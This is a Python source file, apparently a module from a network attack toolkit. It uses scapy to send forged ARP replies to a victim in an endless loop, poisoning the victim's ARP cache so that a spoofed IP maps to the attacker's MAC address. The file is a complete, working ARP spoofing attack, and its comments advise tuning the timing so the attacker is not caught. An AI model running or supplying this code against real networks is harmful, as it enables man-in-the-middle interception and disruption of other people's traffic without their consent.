# **************************************************************************************
# **************************************************************************************
# IMPORTS

from scapy.all import *
import time
import lib.log as liblog
import lib.get_debug as lgd

# *****************************************************************************************************
# *****************************************************************************************************
# AUXILIAR FUNCTION TO CREATE AND SEND THE ARP REQUEST

def create_ARP_request_gratuituous(victim_ip,victim_mac,supplanted_ip,original_mac,original_iface):

	arp = ARP(op=2,
			psrc=supplanted_ip,
        	hwsrc=original_mac,
        	pdst=victim_ip,
			hwdst=victim_mac)
	send(arp,iface=original_iface)
	if lgd.get_dbg()[1]:
		liblog.write_in_file("GRATUITIOUS ARP SENT TO " + victim_ip)

# *****************************************************************************************************
# *****************************************************************************************************
# MAIN FUNCTION TO DEPLOY THE ATTACK
# PARAMETERS:
# --> VICTIM:          ARRAY COMPOSED BY THE IP ADDRESS AND THE ADDRESS OF THE VICTIM. IT MEANS, TO
#                      WHOM WE ARE GOING TO SEND THE SPOOFIND
# --> SPOOFED_IP:      THE IP WHICH WE ARE GOING TO SPOOF
# --> RELATED_MAC:     MAC ADDRESS WE ARE GOING TO RELATE TO THE SUPPLANTED_IP. IT USUALLY IS OUR MAC
#                      ADDRESS
# --> INTERFACE:       INTERFACE THROUGH WHERE WE ARE GOING TO SEND THE SPOOF
# --> WAIT_TIME:       TIME BETWEEN SPOOFINGS. PLAY WITH THIS PARAMETER IN ORDER TO NOT GET CAUGHT BUT
#                      MAKE A USEFUL ATTACK

def attack(victim_ip,victim_mac,spoofed_ip,related_mac,interface,wait_time):
	while True:
		create_ARP_request_gratuituous(victim_ip,victim_mac,spoofed_ip,related_mac,interface)
		time.sleep(float(wait_time))

# *****************************************************************************************************
# *****************************************************************************************************